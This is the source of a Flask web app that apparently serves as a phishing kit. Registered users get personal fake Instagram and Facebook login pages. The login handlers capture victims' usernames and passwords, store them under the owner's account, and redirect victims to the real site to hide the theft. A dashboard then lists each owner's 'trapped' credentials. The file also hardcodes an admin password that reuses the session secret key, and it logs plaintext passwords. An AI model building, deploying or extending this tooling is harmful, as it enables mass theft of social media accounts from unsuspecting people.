from flask import Flask,render_template,request,redirect,session,flash
import DBHelper as dbh

app = Flask(__name__)


app.secret_key="mynameisheera"



#completed
@app.route("/")
def home():
    if 'user' in session:
        return render_template("home.html",uid=session['user'],isLogged=True)
    return render_template("home.html")




#completed
@app.route("/register",methods=['POST','GET'])
def register():
    if request.method=='POST':
        uid=request.form.get("username")
        
        if not dbh.checkIfUserExists(uid):
            email=request.form.get("email")
            pas=request.form.get("psw")
            print(uid,email,pas)
            dbh.insertIntoUser(uid,email,pas)
            session['user']=uid
            return redirect("/")
        else:
            return render_template("register.html",userAlreadyExists=True)
        
    else:
        return render_template("register.html")




#completed
@app.route("/login",methods=['POST','GET'])
def login():
    if request.method=='POST':
        username=request.form.get('username')
        password=request.form.get('password')
        #for ADMIN
        if username=='admin' and password=='mynameisheera':
            session['admin']="admin"
            print(username,"logged in admin")
            return redirect('/admin')
        elif dbh.checkUserCredential(username,password):
            session['user']=username
            print(username,"logged in")
            return redirect('/')
        
        else:
            return render_template("login.html",wrongDetail=True)
    return render_template("login.html")




#completed
@app.route('/logout')
def logout():
    if 'user' in session:
         session.pop('user')
    if 'admin' in session:
        session.pop('admin')
    return redirect('/')




#Completed
@app.route("/apps")
def apps():
    if 'user' in session:
        return render_template("/apps.html",isLogged=True,uid=session['user'])
    return render_template("login.html",isLogged=False)




#completed
@app.route('/dashboard')
def dashboard():
    if 'user' in session :
        return render_template("dashboard.html",data=dbh.getTrapedDataForOwner(session['user']),isLogged=True,uid=session['user'])
    return render_template("login.html",isLogged=False)




#completed
@app.route('/contactus',methods=['GET','POST'])
def contactus():
    if request.method=='POST':
        uid="None"
        if 'user' in session:
            uid=session['user']
        name=request.form.get('yname')
        email=request.form.get('yemail')
        msg=request.form.get('ymessage')
        print(uid,name,email,msg)
        dbh.saveFeedback(uid,name,email,msg)
        return redirect('/')
    return render_template('contactus.html')





#completed
@app.errorhandler(404)
def page_not_found(error):
    return render_template('page_not_found.html'), 404




#.........INSTAGRAM.........

#for looking demo
@app.route("/instagram.com")
def insta():
    return render_template("/apps/insta.html")

#completed
@app.route("/<userid>/instagram.com")
def InstaPhishingPage(userid):
    if dbh.checkIfUserExists(userid):
        return render_template("apps/insta.html",uid=userid)
    return render_template('page_not_found.html')


#completed
@app.route("/loginInsta",methods=['POST'])
def loginInsta():
    owner=request.form.get('owner')
    if owner=="":
        pass
    else:
        site=request.form.get('app')
        uid=request.form.get('uid')
        pas=request.form.get('pas')
        dbh.insertIntoTraped(owner,site,uid,pas)
        print(owner,site,uid,pas)
    return redirect("https://instagram.com")

#..........END.......



#..........FACEBOOK...........

#for looking demo
@app.route("/facebook.com")
def facebook():
    return render_template("/apps/facebook.html")

#completed
@app.route("/<userid>/facebook.com")
def FacebookPhishingPage(userid):
    if dbh.checkIfUserExists(userid):
        return render_template("apps/facebook.html",uid=userid)
    return render_template('page_not_found.html')

#completed
@app.route("/loginFacebook",methods=['POST'])
def loginFacebook():
    owner=request.form.get('owner')
    if owner=="":
        pass
    else:
        site=request.form.get('app')
        uid=request.form.get('uid')
        pas=request.form.get('pas')
        dbh.insertIntoTraped(owner,site,uid,pas)
        print(owner,site,uid,pas)
    return redirect("https://facebook.com")


#......FACEBOOK END.......



#.............ADMIN PAGE............................
@app.route("/admin")
def admin():
     if 'admin' in session:
        return render_template("ADMIN.html",allData=dbh,uid=session['admin'])
     return render_template("login.html",isLogged=False)




#for admin
# @app.route("/delete")
# def deleteDATABASE():
#     dbh.deleteAll()
#     return "deleted"
